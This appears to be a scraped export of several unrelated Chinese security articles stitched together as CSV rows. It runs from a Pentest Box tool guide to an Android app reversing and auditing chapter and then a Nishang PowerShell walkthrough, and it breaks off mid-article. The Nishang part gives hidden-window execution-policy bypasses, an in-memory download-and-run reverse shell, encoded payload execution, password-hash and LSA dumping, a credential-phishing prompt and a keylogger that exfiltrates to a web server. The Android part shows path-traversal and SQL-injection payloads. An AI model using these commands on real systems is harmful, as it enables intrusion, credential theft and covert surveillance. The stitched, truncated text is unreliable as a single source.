Tools列表内。然后你会看到这个列表内所包含的工具集合，下面是相关指令（这里用weevely作例子，请自行更换工具名称）。安装：install weevely更新：update weevely卸载：uninstall weevely返回目录菜单：back退出：exit安装未知第三方脚本除了Pentest Box已知的脚本程序外，我们可能还会需要安装第三方脚本，比如自己编写的脚本程序等。在Pentest Box上也能够满足这个要求。在Pentest Box里安装脚本程序可以自定义脚本的alias（别名）。这个alias可以这么理解，比如sqlmap的启动文件为sqlmap.py，而启动命令为sqlmap。那么sqlmap就是sqlmap.py的alias。这里我用Python脚本做例子，以达到一个抛砖引玉的效果。1. 将脚本程序或者文件夹移动到C:/PentestBox/bin/customtools目录下。（这里请参考你Pentest Box所在目录）2. 部分脚本程序可能需要第三方python库，比如我需要BeautifulSoup4库，那么就执行下面的语句。python -m pip install BeautifulSoup4当然其它的语言库可以可以随意安装，比如ruby就可以使用gem来安装第三方库。3. 因为在Pentest Box中已经预先配置了python环境，你可以直接以python命令运行脚本程序。4. 然后就是添加alias了，alias的配置文件是D:\pentestsBox\bin\customtools中的customaliases文件。如果我要添加sqlmap为sqlmap.py的alias，那么就在该文件中写入下面的命令（注意命令中的路径），然后保存即可。sqlmap=python ""%pentestbox_ROOT%\bin\customtools\sqlmap\sqlmap.py"" $*同理，针对ruby脚本使用以下命令（以wpscan做例子）wpscan=ruby ""%pentestbox_ROOT%\bin\customtools\wpscan\wpscan.rb"" $*可执行程序使用以下例子tool=""%pentestbox_ROOT%\bin\customtools\tool.exe"" $*java脚本使用以下例子tool=start javaw -jar ""%pentestbox_ROOT%\bin\customtools\tool.jar"" $*5. 重启Pentest Box后你就可以使用你自定义的alias了。剩下的大家自己扩展，不再多言。Pentest Box全部相关链接Pentest Box官网：https://www.pentestbox.orgPentest Box官方下载页面：https://pentestbox.org/zh/#downloadPentest Box官方文档：https://docs.pentestbox.orgPentest Box twitter：https://twitter.com/pentestboxPentest Box Facebook：https://www.facebook.com/pentestboxPentest Box Telegram：https://telegram.me/pentestboxPentest Box论坛：https://groups.google.com/forum/#!forum/pentest-box-forumPentest Box GitHub地址：https://github.com/pentestboxPentest Box 火狐浏览器已安装插件：https://addons.mozilla.org/en-US/firefox/collections/pentestbox/pentestbox-addons-collection/?page=1Pentest Box已知未被安装脚本列表：https://modules.pentestbox.org/Pentest Box内置默认工具名单列表：https://tools.pentestbox.org/#linux-utilitiesPentest Box相关信息Pentest Box在2015年发布，具体月份不详。Pentest Box开源项目的创始人是Aditya Agrawa，就是下面图片里这位小哥。这位小哥是一位印度人，网名为exploitprotocol，也是bugcrowd和hackerone众测平台的白帽子。虽然在bugcrowd上的排名只有259名，但是漏洞接收率却是百分之百。排名低的原因主要是这位小哥在2015年的时候离开了众测平台，应该是忙着开发Pentest Box了，在昨天才宣布要回到漏洞平台继续挖掘漏洞。这位小哥宣传自己的也非常低调，只说自己是一名安全研究人员和美食爱好者，并没有加上什么名头，但是他开发的工具已经获得业内一致的好评！不过这位印度小哥开发了这么牛逼的工具，结果却被Kapustkiy拿来黑了众多印度大使馆……..还真是有点讽刺。印度小哥的twitter：https://twitter.com/exploitprotocol印度小哥的个人博客：https://manifestsecurity.com印度小哥的hackerone主页：https://hackerone.com/exploitprotocol印度小哥的bugcrowd主页：https://bugcrowd.com/exploitprotocol在帮助页面上有这个项目的捐助地址，大家可以用paypal或者比特币进行打赏。Pentest Box帮助页面：https://pentestbox.org/zh/#contribute实际上，Pentest Box作为商业用途非常广泛。它的可移植性和兼容性，，必定会有大批量的忠实用户。你可以随意幻想一下，4.5G的Pentest Box，拷到U盘内，走到哪里都可以渗透，只要有windows系统。超强的兼容性，可以复制到云端，大家集体共用一个Pentest Box来做渗透测试，简直是事半功倍。就算商业用途再广泛，这里非常佩服这位印度小哥的开源共享精神。在一些安全大会上，我也见到过国内一些非常出色的安全工具，有些是基于开源代码优化而来的，有些是自己完全开发的，但是大多都不愿意开源共享。不过国内做开源的确非常难做，很多人开源的东西，经常会被他人不注明来源就随意引用。而且因为XX原因，在某国做开源的安全工具非常困难，可能会被“CSB”等等的。我见到过国内很多开源工具到后面都因为不可告人的原因被迫停止了，非常可惜。等等，好像有人送快递给我，但是我想说的就是我讠","2016-11-29 13:02:50","安全工具","不试你可能会后悔，Windows渗透测试利器Pentest Box","http://nsoad.com/Security-tools/20161129/tools-865.html"
"5ccbfb024f2f0a0a7a69c0ff","在本章中，我们将查看 Android 应用程序或 .apk 文件，并了解其不同的组件。 我们还将使用工具（ 如 Apktool，dex2jar 和 jd-gui） 来逆向应用程序。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文出自：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布在本章中，我们将查看 Android 应用程序或 .apk 文件，并了解其不同的组件。 我们还将使用工具（ 如 Apktool，dex2jar 和 jd-gui） 来逆向应用程序。 我们将进一步学习如何通过逆向和分析源代码来寻找 Android 应用程序中的各种漏洞。 我们还将使用一些静态分析工具和脚本来查找漏洞并利用它们。3.1   Android 应用程序拆解Android 应用程序是在开发应用程序时创建的数据和资源文件的归档文件。 Android 应用程序的扩展名是 .apk ，意思是应用程序包，在大多数情况下包括以下文件和文件夹：Classes.dex (文件)AndroidManifest.xml (文件)META-INF (文件夹)resources.arsc (文件)res(文件夹)assets(文件夹)lib (文件夹)为了验证这一点，我们可以使用任何归档管理器应用程序（ 如 7zip，WinRAR 或任何首选应用程序） 简单地解压缩应用程序。 在 Linux 或 Mac 上，我们可以简单地使用 unzip 命令来展示压缩包的内容，如下面的截图所示：这里，我们使用 -l （ list） 标志，以便简单地展示压缩包的内容，而不是解压它。 我们还可以使用 file 命令来查看它是否是一个有效的压缩包。Android 应用程序由各种组件组成，它们一起创建可工作的应用程序。 这些组件是活动，服务，广播接收器，内容供应器和共享首选项。 在继续之前，让我们快速浏览一下这些不同的组件：活动（ Activity） ：这些是用户可以与之交互的可视界面。这些可以包括按钮，图像， TextView 或任何其他可视组件。服务（ Service） ：这些 Android 组件在后台运行，并执行开发人员指定的特定任务。这些任务可以包括从 HTTP 下载文件到在后台播放音乐的任何内容。广播接收器（ Broadcast Receiver） ：这些是 Android 应用程序中的接收器，通过Android 系统或设备中存在的其他应用程序，监听传入的广播消息。一旦它们接收到广播消息，就可以根据预定义的条件触发特定动作。条件可以为收到 SMS，来电呼叫，电量改变等等。共享首选项（ Shared Preference） ：应用程序使用这些首选项，以便为应用程序保存小型数据集。此数据存储在名为 shared_prefs 的文件夹中。这些小数据集可以包括名值对，例如游戏中的用户得分和登录凭证。不建议在共享首选项中存储敏感信息，因为它们可能易受数据窃取和泄漏的影响。意图（ Intent） ：这些组件用于将两个或多个不同的 Android 组件绑定在一起。意图可以用于执行各种任务，例如启动动作，切换活动和启动服务。内容供应器（ Content Provider） ：这些组件用于访问应用程序使用的结构化数据集。应用程序可以使用内容供应器访问和查询自己的数据或存储在手机中的数据。现在我们知道了 Android 应用程序内部结构，以及应用程序的组成方式，我们可以继续逆向Android 应用程序。 当我们只有 .apk 文件时，这是获得可读的源代码和其他数据源的方式。3.2   逆向 Android 应用正如我们前面讨论的，Android应用程序只是一个数据和资源的归档文件。 即使这样，我们不能简单地解压缩归档包（.apk ） 来获得可读的源代码。 对于这些情况，我们必须依赖于将字节代码（ 如在 classes.dex 中） 转换为可读源代码的工具。将字节码转换为可读文件的一种方法，是使用一个名为 dex2jar 的工具。 .dex 文件是由Java 字节码转换的 Dalvik 字节码，使其对移动平台优化和高效。 这个免费的工具只是将Android 应用程序中存在的 .dex 文件转换为相应的 .jar 文件。 请遵循以下步骤：1. 从 https://code.google.com/p/dex2jar/ 下载 dex2jar 工具。2. 现在我们可以使用它来运行我们的应用程序的 .dex 文件，并转换为 .jar 格 式。3. 现在，我们需要做的是，转到命令提示符并访问 dex2jar 所在的文件夹。 接下来，我们需要运行 d2j-dex2jar.bat 文件（ 在 Windows 上） 或 d2j-dex2jar.sh 文件（ 在 Linux /Mac 上） ，并提供应用程序名称和路径作为参数。 这里的参数中，我们可以简单地使用 .apk 文件，或者我们甚至可以解压缩 .apk 文件，然后传递 classes.dex 文件，如下面的截图所示：正如我们在上面截图中看到的，dex2jar 已经成功地将应用程序的 .dex 文件转换为名为 helloworld-dex2jar.jar 的 .jar 文件。 现在，我们可以在任何 Java 图形查看器（ 如JD-GUI） 中打开此 .jar 文件，JD-GUI 可以从其官方网站 http://jd.benow.ca/ 下载。4. 一旦我们下载并安装 JD-GUI，我们现在可以继续打开它。 它看起来像下面的截图所示：5. 在这里，我们现在可以打开之前步骤中转换的 .jar 文件，并查看 JD-GUI 中的所有Java 源代码。为了打开 .jar 文件，我们可以简单地访问 File | Open 。在右侧窗格中，我们可以看到 Java 应用程序的 Java 源代码和所有方法。 请注意，重新编译过程会为你提供原始 Java 源代码的近似版本。 这在大多数情况下无关紧要; 但是，在某些情况下，你可能会看到转换的 .jar 文件中缺少某些代码。 此外，如果应用程序开发人员使用一些防止反编译的保护，如 proguard 和 dex2jar，当我们使用 dex2jar 或 Apktool 反编译应用程序时，我们不会看到准确的源代码; 相反，我们将看到一堆不同的源文件，这不是原始源代码的准确表示。3.3  使用 Apktool 逆向 Android 应用另一种逆向 Android应用程序的方法是将 .dex 文件转换为 smali 文件。 smali 是一种文件格式，其语法与称为 Jasmine 的语言类似。我们现在不会深入了解 smali 文件格式。有关更多信息，请参阅在线 wiki https://code.google.com/p/smali/wiki/ ，以便深入了解 smali。一旦我们下载 Apktool 并配置它，按照前面的章节的指示，我们都做好了进一步的准备。 与JD-GUI 相比，Apktool 的主要优点是它是双向的。这意味着如果你反编译一个应用程序并修改它，然后使用 Apktool 重新编译它，它能跟完美重新编译，并生成一个新的 .apk 文件。然而，dex2jar 和 JD-GUI 不能做类似功能，因为它提供近似代码，而不是准确的代码。因此，为了使用 Apktool 反编译应用程序，我们所需要做的是，将 .apk 文件与Apktool 二进制文件一起传递给命令行。一旦反编译完成，Apktool 将使用应用程序名称创建一个新的文件夹，其中会存储所有的文件。为了反编译，我们只需调用 apktool d [app-name].apk 。这里， -d 标志表示反编译。在以下屏幕截图中，我们可以看到使用 Apktool 进行反编译的应用程序：现在，如果我们进入 smali 文件夹，我们将看到一堆不同的 smali 文件，它们包含开发应用程序时编写的 Java 类的代码。在这里，我们还可以打开一个文件，更改一些值，并使用Apktool 再次构建它。为了从 smali 构建一个改动的应用程序，我们将使用 Apktool 中的 b （ build） 标志。apktool b [decompiled folder name] [target-app-name].apk但是，为了反编译，修改和重新编译应用程序，我个人建议使用另一个名为 Virtuous TenStudio（ VTS） 的工具。这个工具提供与 Apktool 类似的功能，唯一的区别是 VTS 提供了一个漂亮的图形界面，使其相对容易使用。此工具的唯一限制是，它只在 Windows 环境中运行。我们可以从官方下载链接 http://www.virtuous-ten-studio.com/ 下载 VTS。以下是反编译同一项目的应用程序的屏幕截图：3.4  审计 Android 应用Android 应用程序通常包含许多安全漏洞，大多数时候是由于开发人员的错误和安全编码实践的无视。 在本节中，我们将讨论基于 Android 应用程序的漏洞，以及如何识别和利用它们。内容供应器泄露许多应用程序使用内容供应器来存储和查询应用程序中的数据或来自电话的数据。 除非已经定义了内容提供者可以使用权限来访问，否则任何其他应用都可以使用应用所定义的内容供应器，来访问应用的数据。 所有内容供应器具有唯一的统一资源标识符（ URI） 以便被识别和查询。 内容提供者的 URI 的命名标准惯例是以 content:// 开始。如果 Android API 版本低于 17，则内容供应器的默认属性是始终导出。 这意味着除非开发人员指定权限，否则任何应用程序都可以使用应用程序的内容供应器，来访问和查询数据。 所有内容供应器都需要在 AndroidManifest.xml 中注册。 因此，我们可以对应用程序使用Apktool，并通过查看 AndroidManifest.xml 文件检查内容供应器。定义内容供应器的一般方法如下所示：android:name=""com.test.example.DataProvider""android:authorities =""com.test.example.DataProvider""&gt;所以现在，我们将举一个漏洞应用程序的例子，并尝试利用内容供应器泄漏漏洞：1. 为了反编译应用程序，我们将使用 Apktool 来使用 apktool d [appname].apk 反编译应用程序。2. 为了找到内容供应器，我们可以简单地查看定义它们的 AndroidManifest.xml 文件，或者我们可以使用一个简单的 grep 命令，从应用程序代码中获取内容供应器，如下所示：3. 我们可以使用 grep 命令来查找内容提供者，使用 grep –R 'content://' 。 此命令将在每个子文件夹和文件中查找内容供应器，并将其返回给我们。4. 现在，我们在模拟器中安装应用程序。 为了查询内容供应器并确认漏洞是可利用的，我们需要在 Android 设备或模拟器中安装该应用程序。 使用以下代码，我们将在设备上安装易受攻击的 app.apk 文件：$ adb install vulnerable-app.apk1869 KB/s (603050 bytes in 0.315s)pkg: /data/local/tmp/vulnerable-app.apkSuccess5. 我们可以通过创建另一个没有任何权限的应用程序来查询内容供应器，然后查询漏洞应用程序的内容供应器。 为了快速获得信息，我们还可以使用 adb 查询内容供应器，我们可以在以下命令中看到：adb shell content query - - uri [URI of the content provider]以下是在漏洞应用程序上运行的命令，输出展示了存储在应用程序中的注释：在这里，我们还可以使用 MWR 实验室的另一个名为 Drozer 的工具，以便在 Android 应用程序中找到泄漏的内容供应器漏洞。 我们可以从官方网站 https://labs.mwrinfosecurity.com/tools/drozer/ 下载并安装 Drozer。6. 一旦我们安装了它，我们需要将代理组件 agent.apk 安装到我们的模拟器，它位于下载的 .zip 文件内。 该代理是系统和设备相互交互所需的。 我们还需要在每次启动模拟器时转发一个特定的端口（31415） ，以便建立连接。 要在 Mac 和其他类似平台上安装设备，我们可以按照 https://www.mwrinfosecurity.com/system/assets/559/original/mwri_drozer-users-guide_2013-09-11.pdf 上提供的在线指南。7. 一旦完成，我们可以启动应用程序，并单击""Embedded Server（ 嵌入式服务器） ""文本。从那里，我们需要回到设备，启动 Drozer 应用程序，并通过单击名为 Disabled 的左上角切换按钮启用服务器。8. 此后，我们需要访问终端并启动 Drozer，并将其连接到模拟器/设备。 为此，我们需要输入 drozer console connect ，如下面的截图所示：9. 在这里，我们可以运行 app.provider.finduri 模块来查找所有内容供应器，如下所示：dz&gt; run app.provider.finduri com.threebanana.notesScanning com.threebanana.notes…content://com.threebanana.notes.provider.NotePad/notescontent://com.threebanana.notes.provider.NotePadPending/notes/content://com.threebanana.notes.provider.NotePad/mediacontent://com.threebanana.notes.provider.NotePad/topnotes/content://com.threebanana.notes.provider.NotePad/media_with_owner/content://com.threebanana.notes.provider.NotePad/add_media_for_notecontent://com.threebanana.notes.provider.NotePad/notes_show_deletedcontent://com.threebanana.notes.provider.NotePad/notes_with_images/10. 一旦我们有了 URI，我们现在可以使用 Drozer 应用程序查询它。 为了查询它，我们需要运行 app.provider.query 模块并指定内容供应器的 URI，如下面的截图所示：如果 Drozer 能够查询和显示来自内容供应器的数据，这意味着内容供应器泄漏数据并且存在漏洞，因为 Drozer 没有被明确地授予使用数据集的任何权限。11. 为了修复此漏洞，开发人员需要做的是，在创建内容供应器时指定参数 android:exported = false ，或者创建一些新的权限，另一个应用程序在访问供应器之前必须请求它。3.5  不安全的文件存储通常，开发人员为应用程序存储数据时，未指定文件的正确文件权限。 这些文件有时被标记为全局可读，并且可以由任何其它应用程序访问而不需要请求权限。为了检查这个漏洞，我们所需要做的是访问 adb shell ，之后使用 cd 进入 /data/data/[package name of the app] 。如果我们在这里执行一个简单的 ls -l ，就可以看到文件和文件夹的文件权限：# ls -l /data/data/com.aditya.example/files/userinfo.xml-rw-rw-rw- app_200 app_200 22034 2013-11-07 00:01 userinfo.xml这里我们可以使用 find 来搜索权限。find /data/data/ -perm [permissions value]如果我们执行 cat userinfo.xml ，它储存了应用的用户的用户名和密码。#grep 'password' /data/data/com.aditya.example/files/userinfo.xmlmysecretpassword这意味着任何其他应用程序也可以查看和窃取用户的机密登录凭据。 可以通过在开发应用程序时指定正确的文件权限，以及一起计算密码与盐的散列来避免此漏洞。目录遍历或本地文件包含漏洞顾名思义，应用程序中的路径遍历漏洞允许攻击者使用漏洞应用程序的供应器读取其他系统文件。此漏洞也可以使用我们之前讨论的工具 Drozer 进行检查。 在这里，我们用例子来说明由 Seafastian Guerrero 发现的 Adobe Reader Android 应用程序漏洞（http://blog.seguesec.com/2012/09/path-traversal-vulnerability-on-adobe-reader-android-application） 。 此漏洞存在于 Adobe Reader 10.3.1 中，并在以后的版本中进行了修补。 你可以从 http://androiddrawer.com 下载各种 Android 应用程序的旧版本。我们将启动 Drozer，并运行 app.provider.finduri 模块来查找内容供应器 URI。dz&gt; run app.provider.finduri com.adobe.readerScanning com.adobe.reader...content://com.adobe.reader.fileprovider/content://com.adobe.reader.fileprov一旦我们找到了 URI，我们现在可以使用 app.provider.read 搜索并利用本地文件包含漏洞。在这里，我尝试从系统中读取一些文件，如 /etc/hosts 和 /proc/cpuinfo ，它们默认存在于所有的 Android 实例中，因为它是基于 Linux 的文件系统。dz&gt; run app.provider.read content://com.adobe.reader.fileprovider/../../../../etc/hosts127.0.0.1 localhost正如我们在下面的屏幕截图中看到的，我们已经成功地使用 Adobe Reader 漏洞内容供应器读取了 Android 文件系统中的文件。客户端注入攻击客户端攻击通常发生在应用程序未检查用户输入的时候。例如，在对 SQLite 数据库的查询期间，应用程序正在解析用户输入，因为它位于查询语句中。让我们举一个应用程序的示例，它检查本地 SQLite 数据库，来根据登录凭据验证用户。 因此，当用户提供用户名和密码时，正在运行的查询将如下所示：SELECT * FROM 'users' where username='user-input-username' and password='user-input-password'现在，在正常情况下，这将正常工作，用户输入其真正的登录凭据，并且查询取决于条件将返回 true 或 false 。SELECT * FROM 'users' where username='aditya' and password='mysecretpass但是，如果攻击者输入 SQL 语句而不是正常的用户名怎么办？ 请参考以下代码：SELECT * FROM 'users' where username='1' or '1' = '1' - - and password='mysecretpassword因此，在这种情况下，即使用户不知道用户名和密码，他们可以通过使用 1'or'1'='1 查询来轻松绕过它，这在所有情况下都返回 true 。 因此，应用程序开发人员必须在应用程序中进行适当的检查，来检查用户输入。我们还可以使用 Drozer 的 app.provider.query 来利用 SQL 注入漏洞。 其语法看起来像：run app.provider.query [Content Provider URI] --projection ""* FROM SQLITE_MASTER WHERE type='table';- -""现在，这将返回 SQLite 数据库中整个表的列表，它的信息存储在 SQLITE_MASTER 中。 您还可以继续并执行更多的 SQL 查询，来从应用程序提取更多的信息。 为了使用 Drozer 实战漏洞利用，你可以从 https://www.mwrinfosecurity.com/products/drozer/community-edition/ 下载他们的漏洞应用程序。3.6    OWASP 移动 Top10Web 应用程序开放安全项目（ OWASP） 是涉及安全和漏洞搜索的标准之一。 它还发布了前10 名漏洞的列表，其中包括在各种平台中最常见和重要的漏洞。可以在 https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks 上找到 OWASP 移动版的前 10 个指南。 如果我们查看 OWASP 移动项目，以下是它涵盖的移动应用程序的 10 个安全问题：服务端弱控制不安全的数据存储传输层保护不足意外的数据泄漏缺少授权和认证无效的加密客户端注入通过不可信输入的安全决策不正确的会话处理缺乏二进制保护让我们逐一介绍它们，并快速了解它们在移动应用程序中的关系，以及我们如何检测它们：服务端弱控制第一个 OWASP 漏洞是服务端弱控制，顾名思义，服务端不以安全的方式将数据从移动应用程序发送到服务端，或者在发送数据时暴露一些敏感的 API。 例如，考虑一个 Android 应用程序发送登录凭据到服务器进行身份验证，而不验证输入。 攻击者可以以这样的方式修改凭证，以便访问服务器的敏感或未授权区域。 此漏洞可视为移动应用程序和 Web 应用程序中的一个漏洞。不安全的数据存储这仅仅意味着，应用相关信息以用户可访问的方式在设备上存储。 许多 Android 应用程序在共享首选项，SQLite（ 纯文本格式） 或外部存储器中，存储与用户相关的私密信息或应用程序信息。 开发人员应该始终记住，即使应用程序在数据文件夹（/data/data/package-name ）中存储敏感信息，只要手机已 root，恶意应用程序/攻击者就可以访问它。传输层保护不足许多 Android 开发人员依赖于通过不安全模式的网络来发送数据，例如 HTTP 或没有正确实现 SSL 的形式。 这使得应用程序易受到网络上发生的所有不同类型的攻击，例如流量拦截，从应用程序向服务器发送数据时操纵参数，以及修改响应来访问应用程序的锁定区域。意外的数据泄漏当应用程序将数据存储在本身易受攻击的位置时，会出现此漏洞。 这些可能包括剪贴板，URL 缓存，浏览器 Cookie，HTML5 DataStorage ，统计数据等。 一个例子是用户登录到他们的银行应用程序，他们的密码已经复制到剪贴板。 现在，即使是恶意应用程序也可以访问用户剪贴板中的数据。缺少授权和认证如果 Android 应用程序或一般的移动应用程序在没有适当安全措施的情况下，尝试基于客户端检查来验证或授权用户，则这些应用程序最容易受到攻击。 应该注意的是，一旦手机已root，大多数客户端保护可以被攻击者绕过。 因此，建议应用程序开发人员使用服务器端身份验证和授权进行适当的检查，一旦验证成功，请使用随机生成的令牌，以便在移动设备上验证用户。无效的加密这仅仅表示使用不安全的密码函数来加密数据部分。 这可能包括一些已知存在漏洞的算法，如 MD5，SHA1，RC2，甚至是没有适当的安全措施的定制算法。客户端注入这在Android应用程序中是可行的，主要成因是使用 SQLite 进行数据存储。 我们将在本书的各章中执行注入攻击。通过不可信输入的安全决策在移动应用程序中，开发人员应始终过滤和验证用户提供的输入或其他相关输入，并且不应该像在应用程序中那样使用它们。 不受信任的输入通常会导致应用程序中的其他安全风险，如客户端注入。不正确的会话处理在为移动应用程序执行会话处理时，开发人员需要处理很多因素，例如认证 cookie 的正常过期，安全令牌创建，cookie 生成和轮换，以及无法使后端的会话无效。 必须在 Web 应用程序和 Android 应用程序之间维护正确的安全同步。缺乏二进制保护这意味着不能正确地防止应用程序被逆向或反编译。 诸如 Apktool 和 dex2jar 之类的工具可用于逆向 Android 应用程序，如果没有遵循正确的开发实践，它会暴露应用程序的各种安全风险。 为了防止通过逆向攻击来分析应用程序，开发人员可以使用 ProGuard 和 DashO 等工具。总 结在本章中，我们学习了使用各种方法来逆转 Android 应用程序并分析源代码。 我们还学习了如何修改源代码，然后重新编译应用程序，来绕过某些保护。此外，我们还看到了如何使用Drozer 等工具寻找 Android 应用程序中的漏洞。你还可以通过 http://labs.securitycompass.com/exploit-me/ 亲自尝试 Exploit-Me 实验室中的各种漏洞，它由 Security Compass 开发。在下一章中，我们将进一步尝试 Android 应用程序的流量拦截，并在我们的渗透测试中使用它。","2017-02-25 13:58:57","移动安全","Android 渗透测试学习手册（三）Android 应用的逆向和审计","http://nsoad.com/Article/MobileSecurity/20170225/1083.html"
"5ccbfb024f2f0a0a7a69c100","0x00 介绍Powershell用于渗透测试其实早在多年前就已经被提出了。利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而","kong","0x00 介绍Powershell用于渗透测试其实早在多年前就已经被提出了。利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。至今，Nishang最新版本已为v0.67了。本文我将具体介绍这款实用的Powershell渗透测试工具。0x01 使用要使用Nishang，我们首先需要在[作者的Github]上面下载它，之后加载这些脚本。 Nishang需要我们的Powershell版本在v3以上才能使用，这里顺便提供两种查看当前我们当前Powershell版本的方法: 1.直接在我们的Powershell下执行”get-host”命令： 2.我们还可以在Powershell下执行”$PSVersionTable.PSVersion”： 需要知道的是：默认情况下的Server OS 对应的 Powershell的版本：Windows 2008 R2   -   Version 2Windows 2012      -   Version 3Windows 2012 R2   -   Version 4Windows 2016      -   Version 5现在我们需要加载我们的脚本：PS D:\nishang-master&gt; Import-Module .\nishang.psm1你可能会遇到下面的问题： 这是因为我们Powershell的默认的执行策略是Restricted的，而Restricted是不允许任何脚本运行的，我们可以使用下面的命令来来查看当前的执行策略：PS D:\nishang-master&gt; Get-ExecutionPolicy这里我们需要将执行模式改为RemoteSigned，这样就可以执行其他用户的脚本了：PS D:\nishang-master&gt; set-executionpolicy remotesigned //这需要在管理员的状态下执行现在，我们就可以正常进行加载了。 当然，上面是基于我们在本地进行测试的情况下，如果是在真实的攻击场景之下，我们还是不宜去做一些全局策略的更改的，这里简单推荐几个Bypass执行策略的Tricks：0. Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted //设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略1. powershell.exe -executionpolicy bypass -Windowstyle hidden -noninteractive -nologo -File //或是下面这种，-Windowstyle hidden 可以让我们的执行无任何弹窗2. PowerShell.exe -ExecutionPolicy Bypass -File想了解更多姿势，大家可以看看Bypass执行策略的十五种方法： https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/然后，我们使用Dot Sourcing的方式来加载独立的脚本：PS D:\nishang-master&gt; .""D:\nishang-master\Gather\Get-Information.ps1""在之后的使用中，我们可以使用”Get-Help”命令来获取当前脚本的用法和说明等，如：PS D:\nishang-master&gt; .""D:\nishang-master\Gather\Get-WLAN-Keys.ps1PS D:\nishang-master&gt; Get-Help Get-Wlan-Keys还需要说的一点是，我们可以在Powershell中使用” Out-File”来将我们的执行结果导出到文件中，如：PS D:\nishang-master&gt; Get-Information | Out-File res.txt就可以把获取到的信息保存在res.txt中了。 最后，需要介绍两种在内存当中去加载脚本的方式 第一种：powershell iex (New-Object Net.WebClient).DownloadString('http:///Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] //这里IEX可以远程下载我们的脚本第二种，我们可以在Powershell中使用Invoke-Encode脚本来将我们现有的脚本编码压缩，生成编码后的内容，过程如下：PS D:\nishang-master&gt; Invoke-Encode -DataToEncode ""D:\nishang-master\Shells\Invoke-PowerShellTcp.ps1"" -OutCommandEncoded data written to .\encoded.txtEncoded command written to .\encodedcommand.txt在我们的encodedcommand.txt文件中我们可以看到编码后的内容和效果： 然后在目标上(Web shell,meterpreter native shell等都可以)使用如下命令执行：C:\Users\target&gt; powershell -e [encodedscript]这里涉及到的Invoke-PowerShellTcp脚本，我们将在后文对于具体模块的脚本介绍时谈到。0x02 模块介绍0.信息搜集Check-VM从这个脚本的名字就可以看出来，它是用于检测当前的机器是否是一台已知的虚拟机的。它通过检测已知的一些虚拟机的指纹信息（如：Hyper-V, VMWare, Virtual PC, Virtual Box,Xen,QEMU）来识别。 执行方式：PS &gt; Check-VM测试Copy-VSS这个脚本利用Volume Shadow Copy 服务来复制出SAM文件。如果这个脚本运行在了DC机上ntds.dit和SYSTEM hive也能被拷贝出来。 执行方式：PS &gt; Copy-VSS //将会直接把文件保存在当前路径下PS &gt; Copy-VSS -DestinationDir C:\temp  //指定保存文件的路径（必须是已经存在的路径）测试Invoke-CredentialsPhish这个脚本是用来欺骗用户输入账号密码信息的。 执行方式：PS &gt; Invoke-CredentialsPhish测试执行后会弹出这个框欺骗用户输入 直到用户输入正确后这个框才会消失，然后我们就可以得到明文的管理员账号密码：FireBuster FireListenerFireBuster可以对内网进行扫描，它会把包发给FireListener 执行方式：PS &gt; FireBuster 10.10.10.10 1000-1020PS &gt; FireListener -portrange 1000-1020该脚本作者的Github上面还提供了一个Python版的监听端： https://github.com/roo7break/PowerShell-Scripts/blob/master/FireBuster/ 测试 我们首先在我们的机器（Attacker）上面运行FireListener：FireListener 100-110Victim：FireBuster 192.168.199.1 90-110 -VerboseGet-Information这个脚本可以获取目标机器上大量的信息（FTP访问，进程，计算机配置信息，无线网络和设备的信息，Hosts信息等等非超丰富）。 执行方式：PS &gt; Get-Information还可以用我们前面说过的Out-File来将运行结果保存到指定文件。Get-LSASecret该脚本可以获取LSA信息，但是使用的前提当然是你已经成功提升了权限的情况下，通常和我们后面提权当中涉及到的Enable-DuplicateToken（帮助我们获得System权限）联合使用。 执行方式：PS &gt; Enable-DuplicateTokenPS &gt; Get-LsaSecretPS &gt; Get-LsaSecret -RegistryKey KeyName //还可以指定键名Get-PassHashes这个脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。 执行方式：PS &gt; Get-PassHashes -PSObjectFormat //可以使用-PSObjectFormat来格式化输出结果Get-WLAN-Keys在Administrator的权限下，可以利用这个脚本来dump出WLAN文件的密钥信息。实质上，这个脚本就是利用了netsh wlan show profile name=”” key=clear来获取。 执行方式：PS &gt; Get-WLAN-KeysKeyloggerKeylogger可以保存下用户的键盘记录。 执行方式：PS &gt; .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis  //-CheckURL参数会去检查所给出的网页之中是否包含 -MagicString后的字符串，如果存在的话就停止使用记录。PS &gt; .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php //将记录指定发送给一个可以记录Post请求的Web服务器PS &gt; .\Keylogger.ps1 -persist //实现持久化记录（重启后依然进行记录）PS &gt; .\Keylogger.ps1 //直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下key文件中测试 首先执行 PS &gt; .\Keylogger.ps1发现在当前用户的Temp目录下生成了Key的文件，这时我们使用nishang Utility中的Parse_Keys来解析PS &gt;Parse_Keys .\key.log .\parsed.txt然后parsed.txt里面就是解析后的按键记录了Invoke-MimikatzWdigestDowngradeDump出Windows 8.1 and Server 2012的系统用户密码。 执行方式：PS &gt;Invoke-MimikatzWDigestDowngradePS &gt; Get-Job | Receive-Job执行了PS &gt;Invoke-MimikatzWDigestDowngradeWindows会锁屏之后执行Get-Job发现尝试多次都测试失败解决办法可以参考： [域渗透——Dump Clear-Text Password after KB2871997 installed]Get-PassHints这个脚本可以从Windows获得用户的密码的提示信息，需要有Administrator的权限来读取SAM hive。 执行方式：PS &gt; 